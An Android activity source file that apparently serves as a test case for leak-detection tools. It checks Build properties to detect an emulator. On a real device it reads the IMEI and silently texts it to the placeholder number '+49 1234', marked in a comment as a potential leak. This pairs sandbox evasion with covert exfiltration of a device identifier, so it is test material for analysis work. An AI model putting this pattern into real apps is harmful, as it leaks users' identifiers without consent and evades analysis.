package com.example.newedtester;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.widget.TextView;

public class MainActivity extends Activity {
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		TextView txtStatus;
		
		String status = "Can't Detect";
		String  Board, Brand, Device, Fingerprint, Hardware, Manufacturer, Model, Product, Tags, User;
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		txtStatus = (TextView) findViewById(R.id.txtStatus);
		Board = android.os.Build.BOARD;
        Brand = android.os.Build.BRAND;
        Device = android.os.Build.DEVICE;
        Fingerprint = android.os.Build.FINGERPRINT;
        Hardware = android.os.Build.HARDWARE;
        Manufacturer = android.os.Build.MANUFACTURER;
        Model = android.os.Build.MODEL;
        Product = android.os.Build.PRODUCT;
        Tags = android.os.Build.TAGS;
        User = android.os.Build.USER;
    
        if (Hardware.equals("goldfish") || Model.equals("sdk") || Device.equals("generic") || Product.equals("sdk") || Manufacturer.equals("unknown") || User.equals("android-build") || Brand.equals("generic") || Tags.equals("test-keys") || Board.equals("unknown") || Fingerprint.startsWith("generic"))
        {
        	status = "Build: Emulator";
        	
        }
        else
        {
        	TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        	String imei = telephonyManager.getDeviceId(); 
        	
			SmsManager sm = SmsManager.getDefault();
	    	String number = "+49 1234";
	    	sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
        	status = "Build: Device";
        
        }
		
		txtStatus.setText(status);

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}